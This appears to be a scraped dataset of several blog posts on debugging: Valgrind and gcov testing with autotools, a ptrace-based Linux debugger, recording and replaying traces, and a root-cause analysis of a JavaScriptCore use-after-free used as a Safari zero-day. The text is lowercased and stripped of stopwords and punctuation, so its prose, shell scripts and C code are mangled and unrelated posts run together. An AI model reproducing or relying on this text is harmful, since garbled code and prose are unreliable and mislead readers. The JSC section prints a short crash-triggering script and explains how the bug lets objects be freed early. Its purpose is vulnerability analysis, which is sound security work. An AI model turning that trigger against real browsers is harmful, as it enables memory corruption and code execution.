pointer name efficiency programmer convenience kind pointerrelated problem may visible user especially small test case could run situation program technically incorrect nobody notice one day run largerthanusual workload everything come crashing around ear memory leak often profile easy allocate memory forget pointer memory lost program terminates get away long program running small case run longer usual factor cause leak faster usual fails much like nurse counting needle end surgical procedure sure none forgotten inside patient nice run code testing purpose environment track memory sure nt lose valgrind last syllable pronounced like grinned grind refers main entrance valhalla norse legend provides something like general function run program emulated environment individual tool several available peek poke program innards execution default valgrind tool many people take synonymous valgrind something called memcheck memcheck track every bit program state valid valid order provide warning program behaviour becomes nondeterministic result dependence value uninitialized data actually implementation something like colour concept written keeping bit metadata every bit data even aggressive data compression seems like lot work memcheck author put forward claim level accuracy needed correctly handle thing c programmer copying structure may contain alignment gap flag error whenever code read uninitialized data get false positive soon read alignment gap consider data initialized soon written get false negative read copied never actually initialized alignment gap copied structure really getting right requires keeping track initializedornot colour way move data data move memory cpu fine sure worth testing protect silly error fact nt gotten much use particular check yet idsgrep think uninitialized data error nt common skilfullywritten code compiler catch many anyway despite lessaccurate model memcheck memoryleak detection interesting case idsgrep well keeping track validity data memcheck also track allocation deallocations memory block something like freeing block already freed running end array trying dereference pointer west lalaland nt allocated complain may exciting could already find many problem gdb segmentation fault electric fence thorough check memcheck specialty record call stack every time block allocated end program traverse data structure figure block still accessible nt seem leaked give report call stack usually great clue memory lost postrun memory traversal process involves heuristic figure value look like pointer easy imagine theoretical problem get false negative integer happens equal integer value would valid pointer get false positive program representing pointer way standard c pointer type instance hiding bit extra data low bit unaligned pointer pointer middle block custom allocation layer might nonetheless whole thing work surprisingly well practice context idsgrep test suite like one test memcheck leak test possible imagine something elaborate even point running entire regular test suite inside memcheck purpose especially valgrind slow virtualization want one test reasonable coverage run inside memcheck want considered success leak detailed leaktesting leave maintainer manually appropriate needed create kind test idsgrep write another script testvgneko script mentioned previous section example include package test variable content script binsh valgrind devnull devnull echo vgnekoin eids valgrind leakcheckfull idsgrep eids vgnekoout cat vgnekoout test x grep error summary error vgnekoout x rm f vgnekoin eids vgnekoout exit else rm f vgnekoin eids vgnekoout exit fi else echo ca nt find valgrind skipping test exit fi script check actually program named valgrind path otherwise skip test return code described earlier creates small temporary file giving idsgrep data chew run prefix valgrind leakcheckfull command line mean program actually run valgrind default memcheck tool remainder command line taken command valgrind run emulated environment afterward script us cat dump valgrind output captured file standard output automake driver recapture log file check line indicating termination detected error trigger pas fail result pretty straightforward alternate way applying memcheck might make use automake logcompiler feature automake capable recognizing configurable list file extension item test specify compiler example actually compiler used prefix create command line run test instance could specify pllogcompiler perl run pl file test perl variable logcompiler applied test name extension set valgrind leakcheckfull implicitly get memcheck leakchecking test however would nt work case actually described test executables shell script would leakchecking shell rather software supposed test elaborate scheme would needed actually make idea work mentioning possible option someone might want explore thread testing helgrind set similar automakemediated test suite another project package called ecchi unfortunately point ca nt share code ecchi even tell specifically piece software developing part currentlyunpublished academic research project hope point future paper published able release mean time even within project need portability hence autotools also case ecchi used longrunning computation research pretty important result actually correct lot testing stuff described relevant reason telling ecchi ecchi special characteristic creates many opportunity naughty misbehaviour compared idsgrep unlike idsgrep ecchi heavily multithreaded meant run cluster smp compute server use many core simultaneously convince university manitoba let really easy imagine could forget lock piece code atomic cause race condition grab two lock wrong order cause deadlock condition due nature problem solved might happen three week monthlong computation would really bad scene valgrind provides two tool called helgrind drd data race detector analysing thread problem operate roughly similar way memcheck run program test watch thing complain break rule good program ought difference instead enforcing rule memory access allocation helgrind drd enforce rule thread stuff like locking shared data accessing exact way work mired complicated theoretical stuff slept concurrency class nt really understand detail point view logic programmer inclined think generally theorem proving logical statement made property program work correctly multithreaded environment eg two thread access data always able determine one first tool attempt prove statement true difference two seems exactly theoretical model reasoning helgrind seems mature product based general rule code executing code name refers entrance hel one ell place norse afterlife chosen wikipedia editor eternal revert war whether nt see also link christian hell two ell possibly goddess thereof said distinct domain subject another revert war drd closer nature memcheck plus threading test focused specifically race condition involving memory address project found helgrind useful found bug drd nt way knowing whether would generally case interestingly enough helgrind manual caution reader nt work well condition variable ecchi us condition variable extensively nonetheless helgrind seem work well diagnosing bug ecchi use condition variable found bug genuine bug nt seem flag nonbugs maybe using condition variable carefully enough nt trigger undesirable behaviour maybe tool good one issue nt think relates condition variable threadlocal storage think happening start thread system thread library compiler linker specialcase support creates block threadlocal data thread terminates block disposed reused newlycreated thread sometimes got race condition reported involved threadlocal data reordering statement way effect caused warning cease study needed looked like might happening tool saw old thread wrote address new thread read nt synchronize race without noticing new thread access data virtue termination old one much said use output helgrind given structure already described actually running easy created couple test script exercise different feature ecchi likely trigger multithreading issue script run test valgrindhelgrind look much like one already showed running test valgrindmemcheck wanted one valgrinddrd would similar sample script testhgoverlap note check termination zero error memcheck nice consequence reporting result valgrind framework binsh valgrind devnull devnull inputgenerator valgrind toolhelgrind ecchi hgoverlap cat hgoverlap test x grep error summary error hgoverlap x rm f hgoverlap exit else rm f hgoverlap exit fi else echo ca nt find valgrind skipping test exit fi checking test coverage gcov know enough test case one common target full coverage source line run test suite case every line source code generated code executable executed least certainly nt necessarily mean executed correctly way knowing test case properly detected least control flowed every line assurance test exercise intended feature software easy objective criterion evaluate metatest test suite valgrind provides tool specifically couple profilers could applied checking sourceline coverage even though main function gather statistic performance optimization idsgrep chose instead use gcov partly wanted learn worked gcov gnu tool instead running program test emulator us hook c compiler make program collect statistic gcov proper separate tool analysis statistic overall flow much like profiling gprof compile special flag gcc run program run gcov tool requires special messy inefficient compile flag nt something stick simple shell script test normal build instead added option configure want coverage analysis presumably rather le often would run kind test run configure enablegcov make clean make check make clean sure none old noninstrumented object file kicking around everything rebuilt scratch coverage instrumentation first step add line configureac create new commandline option configure acargenable gcov ashelpstring enablegcov use gcov test test suite enablegcovno amconditional condgcov test enablegcov reasonably standard autoconf stuff user chooses new enablegcov option configure condgcov automake conditional become true test conditional code makefileam enable special feature needed coverage checking relevant code actual makefileam spread thing order nt terribly critical automake probably reorder anyway condgcov maybecoverage coverage noinline endif amcflags maybecoverage amcflags mostlycleanfiles idsgrepaux idsgreplog idsgrepblg idsgrepbbl idsgreptoc gcda gcno gcov gcovtests testandor testanynot testbasicmatch testbighash testdemorgan testequal testkvggrone testmessages testspacing testtsugrone testunord define gcdeprecipe testrmgcdalog endef condgcov test testrmgcda gcovtests testgcov foreach test gcovtests eval call gcdeprecipe test testgcovlog foreach test gcovtests test log else test gcovtests testvgneko endif first direct effect condgcov set maybecoverage flag couple extra option gcc coverage option main one tell gcc compile code extra instrumentation particular counter attached every source line incremented executes code write counter gcda file program terminates noinline option turn function inlining particular automatic inlining small function function inlined compiler normally also generates noninline actual function version used time ask pointer function actual function may later pruned linker nt fact need compiler first run ca nt reliably predict found function got inlined automatically gcov ended thinking neverexecuted source line first line definition possibly also closing bracket bottom corresponding nevercalled actual function version function stack frame setup teardown turning inlining prevents gcov complaining notveryinteresting fact function called inline form extra cflags option go separate variable concatenated previous value amcflags line amcflags maybecoverage amcflags note colon equal using regular equal would make amcflags call recursively undesirable effect thing putting added flag separate variable standard automake usage covered manual worth mentioning many people want also specify compiling coveragecheck version theory optimizing compilation deadcode elimination skip generating code source line know nt execute foo foo wo nt warned nt execute code line anyway sure trouble figuring override default appears cflags short committing automake sin actually touching cflags variable supposed reserved user also think extent possible like coverage check code testing way optimization quite possible future change disable optimization rather disabling inlining next thing relevant gcov mostlycleanfiles variable listing file deleted make mostlyclean friend file listed already new addition gcov gcda gcno gcov corresponding profusion gcovrelated file created compiler gcno program test gcda gcov analysis utility gcov every test former test variable actually invoked checking coverage running program gcov instrumentation inside valgrind additional instrumentation seems bad idea memcheck least terribly slow helgrind appears gcov instrumentation threadsafe tried running ecchi gcov instrumentation inside helgrind showed race condition every line executed thousand gave snarky message nt going bother telling fix bug imposing mean gcov used multithreaded code sure least result probably taken grain salt test run inside gcov check except ca nt nt run way listed gcovtests condgcov false normal testing test get set gcovtests plus extra test nt work gcov case mean single script testvgneko mentioned earlier valgrind test gcov nt used finished enablegcov chosen want run thing gcovtests also couple special gcovspecific test testrmgcda run rm gcda file testgcov actually invokes gcov analyser removing gcda file important instrumentation cumulative accumulate count multiple run program test test suite idea start coverage check want start zero count implied gcda file existing set want run test finished want run gcov analyser actually compute coverage checking every line covered bear mind done automake parallel test driver general test could run order moment going worry whether nonthreadsafe gcov instrumentation might also nonthreadsafe regard file system causing fun game two test terminate try write cumulative statistic file simultaneously force testrmgcda run first others start testgcov run last others finish constraint turn make dependency gcdeprecipe multiline make variable defined define get called inside foreach loop generate every test gcovtests recipe saying log file test depends testrmgcdalog force testrmgcda first direction little easier say file testgcovlog depends log file test gcovtests may possible streamline code ideally avoid using gnuspecific feature make still playing code seem work pretty well shown testrmgcda pseudotest simple look like binsh rm f gcov gcda exit deletes file always succeeds end testgcov bit complicated another issue nt mentioned yet think source line coverage test natural thing say want test every line code many bug would like code zero bug simple line code may actually correspond never happen snh error thing design program ought impossible nt able cover line test case something seriously wrong one example idsgrep match function result matching algorithm involves bunch special feature implemented function higherlevel general matching function call lowerlevel specific matching function via pointer higherlevel function nt actually know complete list lowerlevel function might deal know call pointer something like oop polymorphism achieved nonoop language lowerlevel function return finding setting value enumeratedtype field supposed five different possible value higherlevel function take field value us switch statement reason safety nt trust lowerlevel function actually limit result five official value default clause switch executes lowerlevel function return invalid value case print error message immediately terminate never happen serious bug code input overall program actually cause line execute exist test suite consisting input output overall program achieve coverage one way deal sort thing would unit testing said test suite consisting input output program could test snh line let create test suite consist input output program instead testing entire program might write separate stub program link higherlevel matcher call pointer madeforthepurpose badly behaved lowerlevel function return bad result trigger snh error enthusiastic especially program small idsgrep mean writing even code nt directly useful exists get around formal requirement coverage know damn well put complaint exit even nt case would matter would case much bigger thing worry nt necessitate writing another entire program even stub one suppose another way avoid problem would live dangerously never check snh error code never execute dead code maybe nt included bloat executable missing coverage snh error instance may code execute circumstance could create lot expense inconvenience printer fire might example want code run circumstance nt want actually set printer fire every time run test something often industry choose random number le usually say percentage test coverage considered good enough thus accommodating reasonable amount untestable code johnny ca nt read least big advantage something objectively measurable even sensible way say acceptable percentage idsgrep chose different route going insist coverage line manually marked snh coverage line marked specific overall number uncovered line tolerate every uncovered line thought decided purpose good enough excuse gcov analysis utility run produce summary percentage coverage source file looking line thus really want ended writing perl script parse gcov file compute coverage way want computed script little long include verbatim download svn repository scan gcov file include c source line well number execution count percentage line include snh snh executed percentage line include one marker executed percentage unmarked marked line executed respectively print little report percentage coverage file overall pass return code shell script saying whether goal achieved testgcov script remember run last make check enablegcov selected shown run gcov run checkcoverage return success driver checkcoverage returned success run grep find line nt executed line marked snh whether executed dump line window context log file idea coverage adjusted snh test suite say pas say fail look log get clue coverage inappropriate binsh gcov r c gcov c devnull devnull perl c checkcoverage gcov exit else grep e snh gcov exit fi one small thing worth mentioning script try run gcov r option ignoring system header file basically first fails run gcov option first wrote gcov r script following documentation gcov discovered system including many mine installed gcov old enough support option even upgrade system many people done yet fall back using option available note testing autotools valgrind gcov happy hacking update subsequent writing found hard way gcov profileanalyser tool undesirable behaviour run multiple source filename gcno node file every specified source file occur instance source file exists nt get compiled due local configuration choice like copy getoptc supplied system need build set use system getopt possible nt affect idsgrep affect ecchi changed thing case gcov see source file node file produce error message abort processing file end executable line message coverage reported many file containing code certainly probably actually execute workaround call gcov analyser one source file time replacing gcov r c gcov c devnull devnull srcfile c gcov r srcfile gcov srcfile devnull devnull done seems like maybe apply h file well c file since certainly contain executable code test seem end getting included automatically may necessary share facebook facebook twitter reddit reddit linkedin linkedin
296,Lobsters,debugging,Debugging,Why Isn't Debugging Treated As A First-Class Activity?,https://robert.ocallahan.org/2018/07/why-isnt-debugging-treated-as-first.html,nt debugging treated firstclass activity,part part advertised feature debugging missing feature update hn comment,mark côté published vision engineering workflow mozilla part part sound really good point checking full mozillacentral source fast source code history easily navigable installing development environment fast easy building fast review straightforward streamlined code landed automatically bug handling easy fast friendly metric comprehensive discoverable understandable information code flow clear discoverable consider also gitlab advertised feature regardless process gitlab provides powerful planning tool keep everyone synchronized create view manage code project data powerful branching tool keep strict quality standard production code automatic testing reporting deploy quickly massive scale integrated docker container registry gitlab integrated cicd allows ship code quickly one one thousand server configure application infrastructure automatically monitor metric know change code impact production environment security capability integrated development lifecycle one thing developer spend lot time completely absent list debugging gitlab nt even list anything debuggingrelated missing feature nt debugging treated worthy attention genuinely nt know like hear theory one theory debugging ignored people working system nt aware anything could improve solution problem pernosco need raise awareness progress possible therefore debugging demand investment progress possible debugging solution deeply integrate increasingly cloudbased development workflow described another theory many developer abandoned interactive debugger poor fit many debugging problem eg multiprocess timesensitive remote workload especially cloud mobile application recordandreplay debugging solves problem perhaps people stopped using class tool altogether stop looking better tool class perhaps people equate debugging using interactive debugger trapped add logging build deploy analyze log cycle look way improve step tool shortcircuit process update hn comment great example attitude using debugger debugging
297,Lobsters,debugging,Debugging,"Making a low level (Linux) debugger, part 3: our first program",https://blog.asrpo.com/making_a_low_level_debugger_part_3,making low level linux debugger part first program,making low level linux debugger part first program part part empty note sample session ipython setting part simple model forthlike interpreter loop primitive test program sierpinski triangle concluding remark appendix debugging note loadstate bug rtldlazy string escape appendix change interim disabling compiler optimization footnote source source post blog index r feed contact,making low level linux debugger part first program continues series make debugger live editor creating assembly c program part got assembly part readwrite register memory single step single instruction execution function call although perfect setrestore breakpoints memory allocation examining upcoming instruction part got c part readwrite variable using ptrace memory map c readevalprint loop repl line number dwarf header undo using fork time actually use debuggereditor try use write c program use three different file starting file containing main function runonce shared library runonceso another shared library libraryso compiled libraryc finalized source reside try keep mostly unchanged instead alter libraryc eventually become program adding main function libraryc initially empty note sample session wanted talkwalk sample session however quite hard convey difficult something thing like savestate loadstate nt worth mentioning every time use also python interpreter actually using ipython repl copying text editor interpreter helpful environment case error many mistake makeam led ot make screen recording entire unedited session contains everything last long difficult focus excerpt want draw attention edited session nt necessarily justice stumbling block end stick similar format earlier part add appendix detour setting first add reloadlibrary function similar reloadrunonce reload libraryso def reloadlibrary command gcc shared x c libraryso fpic libraryc gccproc subprocesspopen shlexsplit command gccproccommunicate gccprocreturncode error cfunccall reloadlibrary loadlibvars libraryso add void dllibrary void reloadlibrary dllibrary null dlclose dllibrary dllibrary dlopen libraryso rtldnow similar reloadrunonce last time change recompile start python interpreter interactive mode python threefiles setup want runonce access variable libraryc since libraryso also dynamically loaded get access extern however described part use dlsym get pointer example int memory libraryc extern void dllibrary void runonce int memory dlsym dllibrary memory source effectively give u access memory variable add array clibglobals variable want extract using dlsym change generated runonceso accordingly cglobalsappend void dllibrary clibglobals def dllibvar var type name varsplit return type name dlsym dllibrary name type type name name def cprogram cline rawfalse return include stdioh include dlfcnh void runonce n join cglobals n join dllibvar var var clibglobals cline change first line runc use cprogram def runc cline command gcc shared x c runonceso fpic gccproc subprocesspopen shlexsplit command stdinsubprocesspipe gccproccommunicate inputcprogram clinesencode stringescape memory array example simply run clibglobalsappend int memory test runc memory runc printf memory unfortunately clibglobals variable pointer found better way mean integer array integer pretend array size write varname everywhere would write varname including assignment simple model goal eventually make interpreter let make simple one test debugger used make program course forthlike interpreter memory array primitive data parameter stack call return stack let make thing simpler first memory primitive program counter lieu call stack otherwise model memory array primitive main loop executes primitive program counter increment program counter repeat add memory already done previous step programcounter libraryc int memory int programcounter reloadlibrary check thing working properly reloadlibrary clibglobalsextend int memory int programcounter runc printf programcounter interpreter loop let implement model described iteration interpreter loop read memory program counter lookup corresponding function call increment program counter something like funcptrarrayt primitive memory programcounter programcounter let create test primitive adding loop primitive primitive start first test since debugger write value nt need parse compile input yet instead use debugger write program want directly memory set program counter starting position perhaps simplest primitive noop pas python nothing void donothing make primitive another option would make primitive error accidentally executing fresh piece memory would immediately fail let add something interesting primitive make readwrite memory thing try chosen model readwrite program counter run first test two primitive let make second primitive change next primitive run void toggle memory programcounter memory programcounter add function print first entry memory test primitive void printmemory int printf memory printf n reloadlibrary cfunccall printmemory start libraryso clibglobalsappend void toggle runc toggle stdin function stdin error called object function function pointer stdin note declared stdin error expected token last line give error ca nt directly call void pointer first cast function pointer runc typedef void voidfuncptrt void voidfuncptrt toggle cfunccall printmemory start libraryso put primitive array planned void primitive void donothing toggle try calling index reloadlibrary clibglobalsappend void primitive cfunccall printmemory start libraryso runc void void primitive cfunccall printmemory start libraryso easier access add type typedef void funcptrarrayt void cprogram runc funcptrarrayt primitive would effect test program still bit boring two primitive one nothing enough first test add interpreter main loop run test program program donothing let set one entry memory say memory reloadlibrary runc memory cfunccall printmemory start libraryso appendix string escape describes error encountered fix making automatic string escape optional runc cline rawtrue try escape character cline runc prog rawtrue cfunccall printmemory start libraryso let add function run one iteration main loop def iter runc funcptrarrayt primitive memory programcounter programcounter rawtrue runc printf programcounter cfunccall printmemory start libraryso test iter run loop time put c loop since nt halting primitive stopping condition would run process interrupted instead let run programcounter far enough say index higher def runloop prog programcounter funcptrarrayt primitive memory programcounter programcounter runc prog rawtrue let also print much memory void printmemory int printf memory printf n run loop reloadlibrary runc memory runloop cfunccall printmemory start libraryso let pretend memory circular programcounter value modulo run loop time def runloop prog programcounter funcptrarrayt primitive memory programcounter programcounter programcounter runc prog rawtrue cfunccall printmemory start libraryso range runloop oh look sierpinski triangle concludes first test good place stop concluding remark working debugger generally pleasant nt get use number feature like breakpoints assembly stepping execution even loadstate savestate limited use reloadlibrary mostly reset state maybe complex program feature become useful hopefully also able evolve debugger alongside interpreter making also debugger interpreter language last thing nt gotten around using graphical debugger appendix debugging note loadstate bug right bat trying call function shared library loadstate give error old pid used instead processpid loadlibvars wrong memory map read replacing pid processpid everywhere fix rtldlazy reading variable libraryso reloaded sometimes resulted old value guessing problem come rtldlazy dlopen man page relocation shall performed implementationdefined time ranging time dlopen call first reference given symbol occurs accessing variable symbol debugger directly would nt count first reference symbol least think source problem case replacing rtldlazy rtldnow seem fix issue string escape convenient able run runc printf hello worldn without escape backslash actually want run multiline command prog funcptrarrayt primitive memory programcounter programcounter runc prog stdin function stdin error stray program stdin warning implicit declaration function wimplicitfunctiondeclaration stdin error subscripted value neither array pointer vector stdin error stray program stdin error expected token give compiler error endoflines n replaced n change runc take optional argument prevent running encode stringescape source def runc cline rawfalse raw cline clinesencode stringescape command gcc shared x c runonceso fpic gccproc subprocesspopen shlexsplit command stdinsubprocesspipe gccproccommunicate inputcprogram cline runc prog rawtrue run appendix change interim change also happened includes able readint shared object library optional start offset using global tmpaddr variable instead reserving new memory call safefunccall disabling compiler optimization helpful response part suggests adding would result assembly closer c source something worth trying footnote arrangement tried even though nt perfect work decently workflow dynamically reload library running single line without debugger could hard coded initial value start program source source post file folder posted jul blog index r feed contact
298,Lobsters,debugging,Debugging,Timeless Debugging of Complex Software,https://blog.ret2.io/2018/06/19/pwn2own-2018-root-cause-analysis/,timeless debugging complex software,root cause analysis security impact fuzzing recordreplay part one initial analysis left existing flag jit recordreplay debugging rr ttd panda qira new weird automate recording vulnerability designed robert replaying vulnerability trace butterfly jsarray jspromise life death rebirth scribbling riptide autopsy riptide arrayreverse considered harmful markandsweep zeroday fixed vulnerability origin high sierra ossfuzz conclusion,software security root cause analysis rca process used irregular software execution measure security impact asymmetry process often involve form user controlled input proofofconcept cause target application crash misbehave otherwise post document process performing root cause analysis nondeterministic bug discovered fuzzing javascriptcore utilizing advanced recordreplay debugging technology mozilla identify underlying bug use understanding issue speculate exploitability using mozilla rr one place memory breakpoint run execution trace backwards toplevel discussion blog series entire exploitchain check part one initial analysis refresher left previous post j fuzzer produced interesting crashing testcase javascriptcore trimmed problematic testscase minimized pocjs still demonstrated unexpected behavior jsc initialize jsarray jsarrays var array var var index index index async function cval cindex carray carrayreverse print array content debug info var print print tostring print describearray abnormal behavior observed sometimes jspromise object would appear scattered randomly throughout yet nowhere pocjs store promise object expect jsarray object end testing minimized poc debug build jsc issue reproduced nondeterministically hinting bug could race condition based pocjs initial thought perhaps implementation async function decorator might data safety issue hard make concrete assertion early citing existing resource learned countless debug flag available jsc effort rca process used one debug flag disable jit setting following environment variable running pocjs jsc toggle set notice execution notably slower issue would still reproduce learned jit based bug eliminating significant portion codebase complexity root cause consideration remaining nondeterminism paired unfamiliarity codebase made traditional debugging impractical building understanding issue must employ advanced technique analyze defect recordreplay debugging past several decade core experience prominent cc debugger frozen time platform recent year begun see technology revisited innovated upon truly novel manner particular general availability robust timeless debugging game changer industry project rr ttd mit lincoln panda even qira laid foundation enable new weird way u explore automate many complex debugging task thus far adoption application technology broader security development community negligible compared possible utility hard speculate way technology come change way use debugger experience application runtimes year follow hubble experimental debugger frontend navigating rr ttd runtime trace context post go far demonstrate standard usage rr extension gdb hope discus exploratory research tool built top timeless debugging framework future innovation space nothing exciting alien recording vulnerability returning back earth begin analyzing strange behavior produced minimized testcase using timeless debugging technology introduced previous section use rr record jsc process executes pocjs ubuntu vm tracing jsc rr done one command jscusejitfalse ldlibrarypathhomedoomwebkitrcajscdebuglib rr record h homedoomwebkitrcajscdebugbinjsc bugspocjs since rr good capturing trace deterministic fashion actually make use mode h flag get pocjs reproduce errant jsc behavior traced chaos mode rr purposely throw wrench thread scheduling recording process effort force different execution pattern across multiple run mode designed explicitly help reproducing nondeterministic bug rr bravo robert capturing trace poc using mozilla recordreplay framework trace rr produce reproducible runtime trace used directly gdb beauty tracing technology never relaunch jsc touch poc trace provides perfect information captured process runtime navigated timelessly debugger replaying vulnerability trace debugging captured trace simple passing trace rr replay rr replay drop u augmented version gdb reverse debugging command among others available use rr extends standard gdb adding number new command bidirectional debugging typing continue rr enlightened gdb prompt watch captured trace run start finish previously recorded outside debugger replaying captured trace via rr replay gdb end trace see debug print describearray call placed end pocjs print tell u backing store butterfly misbehaving jsarray memory dumping memory butterfly see gob pointer dumping jsarray butterfly reveals pointer j cell expected pointer j cell object effectively stored jsarray want figure pointer jspromise cell got array butterfly follow one first pointer butterfly specifically dumping data around address first entry butterfly see interleaving two different type j cell heap swath jsarray jspromise cell interleaved heap aligns observed scrolling runtime print produced testcase first thousand entry array alternate jspromise object jsarray nowhere pocjs explicitly store promise investigative standpoint still difficult reason true nature bug dealing life death rebirth mystery begin unravel follow lifetime one jspromise cell specifically use rr run backwards discovering jspromise located actually came using mozilla rr one place memory breakpoint run execution trace backwards placing memory watchpoint executing reverse see exactly memory promise cell last written memory breakpoint trip following callstack callstack recent write jspromise found errant array callstack seems indicate last write promise cell creation memory used prior becoming promise object find continue executing backwards writes following callstack kind callstacks want looking chasing exploitable bug top callstack see within jsc scribble scribbling general technique used debug build software overwrite freed data known pattern byte make clear developer whether heap data looking freed state freed heap allocation scribbled current callstack clear definitely considered fact appears whole block heap data scribbled indicated value keep going back still know memory used freed memory breakpoint still set continue executing backwards one time reveal final callstack prior freed used jsarray cell callstack tell u pointer following backwards originally allocated jsarray allocation made towards start testcase presumably one jsarray object explicitly created stored problematic var array create jsarray size var create store empty jsarray point determined least jsarray object create store beginning testcase mistakenly freed execution also attribute creation jspromise allocation fact calling async function three time item var index index index async function cval cindex carray carrayreverse number jspromise cell testcase spews happen get allocated mistakenly freed jsarray cell blissfully unaware pointer butterfly point newly allocated promise explains jspromise object seem magically appear throughout still understand jsc think original jsarray object store okay free easy question answer requires u debug new concurrent garbage collector called riptide autopsy need understand garbage reasoning believing free able best place begin journey backwards depth garbage collector gc scribbling death highlighted previous section closer inspection callstack time death show approximately data scribbled jsc scribble jsc markedblock handle specializedsweep reading riptide developer state heap memory divided block block contains cell cell block cell size called size class description give u idea structure heap exactly markedblock regard eg freeing riptide article state sweeping incremental sense sweep block allocating perblock bit tell sweeper block completely empty sweeper set bumppointer arena whole block rather constructing freelist mirror exactly see current callstack attempting allocate new memory jspromise cell candidate heap block selected swept incorrectly must getting set somewhere indicating whole block free actually still use callstack creation jspromise object ended stepping backwards callstack bit see owner heap allocator seems hold block status bit accessed call mallocator isempty heap block empty bit actually held parent allocator digging generated macro isempty find bit vector mempty responsible tracking block managed allocator considered empty block one allocation considered inuse case empty status represented index eg bit mempty using debugger print bit level representation bit vector backing memory block bit fall within also also print boolean representation whether bit set indicating whether block considered printing dword isempty bit fall within printing boolean status explicit bit introspection confirms everything know far empty bit indeed set block gc belief markedblock fall within empty dare set bit placing memory breakpoint bit vector mempty continue executing backwards various bit flip writes bit vector stopping origin bit garbage collector lovely dark deep bit set within mempty bit vector assignment end marking phase specifically mempty get original set bit combining bit vector mlive mmarkingnotempty dumping bit block respective bit vector expect heap block alive mlive true make sense mmarkingnotempty set false meaning single j cell block observed marking thread seem right setting write watchpoint mmarkingnotempty bit vector running backwards stopped multiple time marking thread setting bit indicate heap block eg use marking thread continually walk j cell heap inuse determine memory reclaimed callstack depicts marking thread walking butterfly length implying certainly marking content problematic thing get really interesting place watchpoint butterfly index containing never get marked continue hitting watchpoint std reverse running main thread marking occurring new memory watchpoint trigger immediately flip marking thread main thread middle calling std reverse butterfly marked good identified root cause vulnerability butterfly reversed eg modified main interpreter thread simultaneous marking thread walking butterfly content arrayreverse considered harmful new jsc garbage collector employ thread dedicated walking marking j cell object heap part markandsweep implementation j cell garbage collector mean object still object block marked prone get freed necessary vulnerability data hazard race condition marking thread arrayreverse diagram depicting data race marking array reversal asynchronous marking thread walking butterfly jsarray arrayreverse called main interpreter thread timed correctly portion content may elude marking traversal making object eligible get freed next sweep vulnerability particularly powerful attacker prematurely free type j object jsc simply storing jsarray calling arrayreverse forcing useafterfree scenario almost universally considered critical security issue exploited vulnerability zeroday achieve remote code execution rce context safari web browser issue since fixed apple vulnerability origin bug introduced javascriptcore early direct result arrival riptide vulnerability began shipping globally safari starting release macos high sierra september transitioning javascriptcore concurrent garbage collector broke many assumption made original codebase code arrayreverse correct first written another dimension added reality riptide ultimately compromised security posture complexity scale browser feel unfair point finger blame one developer introducing issue like without intimate understanding new garbage collector phantasmal manner operation developer security researcher would likely enough context identify bug code review practically speaking vulnerability well regression caught something like ossfuzz part webkit software development lifecycle conclusion root cause analysis test understanding attacker defender alike bug take mere minute identify issue ass security impact time take multiple day creative debugging gather enough context bug afflicted codebase fix exploit issue fourth installment series break process weaponizing javascriptcore vulnerability documented post present improved poc walk process building arbitrary code execution safari
299,Lobsters,debugging,Debugging,Making a low level (Linux) debugger part 2: C,https://blog.asrpo.com/making_a_low_level_debugger_part_2,making low level linux debugger part c,making low level linux debugger part c last time modifying c variable handling segfaults article memory map c repl defining function line number dwarf elf getting stack edit undo edit waiting cleaner state child termination testing undo using debuggereditor footnote odd end side note globals interactivity undo checkpointing lot program footnote stackoverflow page assembly register p p b p source source post blog index r feed contact,making low level linux debugger part c last time started making debugger live editor creating assembly c program got assembly part readwrite register memory single step single instruction execution function call although perfect setrestore breakpoints memory allocation examining upcoming instruction post try similar thing c portion next time try using make something modifying c variable since know location c variable binary header extracted variable function read write location memory directly help know variable type know many byte read write example ints could define def readint varname addr start cvariables varname type size h return structunpack type processreadbytes addr size def writeint varname value addr start cvariables varname type size h processwritebytes addr structpack type value array take contiguous region memory read one go byte parsed handling segfaults setup unexpected error handling could time setting make troubleshooting issue later addition easier default program get segmentation fault segfault signal sigsegv crash exit instead setup function called print useful information segfaults essentially use article create function btsighandler print backtrace use sigaction system call called segfault void registersignals struct sigaction sa sasahandler void btsighandler sigemptyset sasamask sasaflags sarestart sigaction sigsegv sa null instead could also used debugger print backtrace note need let process continue run body btsighandler paused debugger memory map next goal get c repl first take look memory map strictly needed give u better idea thing start scattered reading writing memory debugger refer absolute address loading thing like library variable aout executable file usually copied nonoverlapping region region available proc pid map text form pid pid traced process getting start region aout adding address read header function gave u actual address memory beginning function file proc pid map text formatted follows address perm offset dev inode pathname rxp usrsbingpm parse put python dict collection import defaultdict def memorymaps mmap defaultdict dict mmapedcounter line open proc smaps pid readlines len linesplit line mmaped mmapedcounter mmapedcounter region permission offset dev inode filename linesplit start end int x x regionsplit mmap filename permission start start end end offset int offset dev dev inode int inode return mmap content proc pid map change allocate deallocate memory convenience also add function finding region address belongs mmap memorymaps def findsection mmap address filename mmap perm region mmap filename item region start address region end return filename perm address region start use like findsection mmap processgetreg rip rxp c repl getting c repl bit trickier use dynamic library loading libdl accomplish run line c create temporary c source runoncec compile create shared object file gcc shared x c runonceso fpic runoncec load current running c program dlopen runonceso rtldlazy since also created ptraced c program easiest add function use call debugger later include dlfcnh void dlrunonce contain dynamically loaded library void reloadrunonce dlrunonce null dlclose dlrunonce dlrunonce dlopen runonceso rtldlazy able access variable declare extern temporary c file also include library needed like stdioh use printf extern int foobar python program put entire temporary program string create subprocess call gcc pipe program stdin list cglobals hold list variable externed want access import shlex cglobals def loadlibvars filename global libvars libstart l l open proc smaps pid readlines lendswith filename n libstart int libvars elfreadervariables filename cvariablesupdate libvars def runc cline program include stdioh void runonce n join cglobals clinesencode stringescape command gcc shared x c runonceso fpic gccproc subprocesspopen shlexsplit command stdinsubprocesspipe gccproccommunicate inputprogram gccprocstdinclose gccprocreturncode error cfunccall reloadrunonce loadlibvars runonceso cfunccall runonce libstart try runc printf hello worldn hello world nt forget stdout buffered c without end line n would see text appear cglobalsappend int foobar runc printf value foobar foobar value foobar note instead want call dynamically loaded function c instead debugger could store function variable call typedef int funcptrt void type match function void input int output void libfunc libfunc dlsym dltest somefuncname printf libfunc output dn funcptrt libfunc defining function dynamically define function add source compiled runonceso could also create shared library live dynamically load eventually would included main program recompiled line number default header aout include information line number c source ask gcc include flag add dwarf header aout previously read elf header wo nt say dwarf format nt know basically look like list thing compilation unit thing xmllike document debugging information entry may nested refer interested thing list file loaded memory obtained memorymaps see dwarf header extract list xmllike document store alldwarfinfo elftoolsdwarfdescriptions import describeformclass alldwarfinfo def diebounds die lowpc dieattributes dwatlowpc value highpcattr dieattributes dwathighpc highpcattrclass describeformclass highpcattrform highpc highpcattrvalue highpcattrclass address else highpcattrvalue lowpc 